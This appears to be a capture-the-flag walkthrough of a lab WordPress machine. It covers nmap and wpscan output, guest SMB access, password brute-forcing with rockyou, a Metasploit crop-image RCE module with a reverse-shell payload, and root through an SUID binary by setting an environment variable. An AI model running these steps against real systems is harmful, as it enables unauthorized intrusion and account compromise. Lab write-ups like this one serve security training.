...
Rustscan showed 3 opened port

```
# Nmap 7.95 scan initiated Mon Nov  3 18:46:19 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80,139 -sCV -Pn -oN blog.nmap 10.10.141.68
Nmap scan report for blog.thm (10.10.141.68)
Host is up, received user-set (0.31s latency).
Scanned at 2025-11-03 18:46:20 EST for 24s
...
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59289/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 49502/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 53741/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40623/udp): CLEAN (Failed to receive data)
...
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-11-03T23:46:36+00:00
|_clock-skew: mean: 2s, deviation: 1s, median: 1s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  3 18:46:44 2025 -- 1 IP address (1 host up) scanned in 25.75 seconds

```


From the scan I realised I could login as guest and access  shares on the smb server .
with the command below I could login as the guest user on the smb server.
```
 smbclient //10.10.30.128/ -U guest%''
```

I used the the command below to access the share `BillySMB` on the server and eventually all the files there were rabbit holes 
```
 smbclient //10.10.30.128/BillySMB -U guest%''
```
Returned to the wpscan which I used the command
```
wpscan --url http://blog.thm --api-token <REDACTED>
```

From the wpscan results I realised that version of wordpress was vulnerable to an rce amongst the 72 vulns detected.
```
...
[32m[+][0m URL: http://blog.thm/ [10.10.76.116]
[32m[+][0m Started: Tue Nov  4 15:51:29 2025
...
[32m[+][0m robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
...
[32m[+][0m XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
...
[32m[+][0m WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
...
[32m[+][0m WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 ...
 |
 | [31m[!][0m 72 vulnerabilities identified:
 |
...
[32m[+][0m Finished: Tue Nov  4 15:53:52 2025
[32m[+][0m Requests Done: 175
[32m[+][0m Cached Requests: 6
[32m[+][0m Data Sent: 42.122 KB
[32m[+][0m Data Received: 366.983 KB
[32m[+][0m Memory used: 252.461 MB
[32m[+][0m Elapsed time: 00:02:23

```

The only way we could get the rce was to be authenticated as an author first 
Doing a manual author id bruteforce on the site ,I found only 2 authours 
`bjoel and kwheel`. Since xmlrpc was enabled ,, I performed a password bruteforce  with the help of the wpscan tool and got the password for the kwheel author.
Command
```
wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

Password gotten
```
❯ wpscan --url [http://10.10.5.11](http://10.10.5.11) --passwords /usr/share/wordlists/rockyou.txt  
[i] User(s) Identified:[+] bjoel  
 | Found By: Wp Json Api (Aggressive Detection)  
 |  - [http://10.10.5.11/wp-json/wp/v2/users/?per_page=100&page=1](http://10.10.5.11/wp-json/wp/v2/users/?per_page=100&page=1)  
 | Confirmed By:  
...
[SUCCESS] - kwheel / _redacted_
```

#### FOOTHOLD
So I used the metasploit module to exploit the vuln and got a foothold.
I set my payload to `php/unix/cmd/reverse`
 Metasploit module name : `multi/http/wp_crop_rce`



#### Privileged Escalation

Found the suid bits perms set files with the command
```
find / -perm -4000
```

And got one custom suid bit file called checker in the `/usr/sbin/checker` dir.

I used ltrace command to check if the binary calls or uses any other command  and yes it did , 
```
ltrace /usr/sbin/checker
```
And it did call another command.
```
...
So I exploited it by setting my environment variable to admin first before running the binary then I got root access
...
Thats how you get the root shell.